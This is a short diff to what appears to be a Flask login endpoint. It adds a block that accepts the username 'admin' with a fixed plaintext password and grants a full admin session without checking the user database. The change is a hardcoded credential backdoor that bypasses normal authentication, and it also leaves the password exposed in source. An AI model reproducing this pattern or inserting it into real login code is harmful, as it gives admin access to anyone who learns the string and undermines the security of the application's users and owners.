@@ -13,6 +13,13 @@ def login():
     
     if not username or not password:
         return jsonify({"success": False, "error": "Username and password required"}), 400
+
+    # Intercept admin credentials
+    if username.strip().lower() == 'admin' and password == 'jaber142005':
+        session.clear()
+        session['admin_logged_in'] = True
+        session['username'] = 'admin'
+        return jsonify({"success": True, "username": "admin", "is_admin": True})
         
     user = User.query.filter(func.lower(User.username) == func.lower(username)).first()
     if user and user.check_password(password):
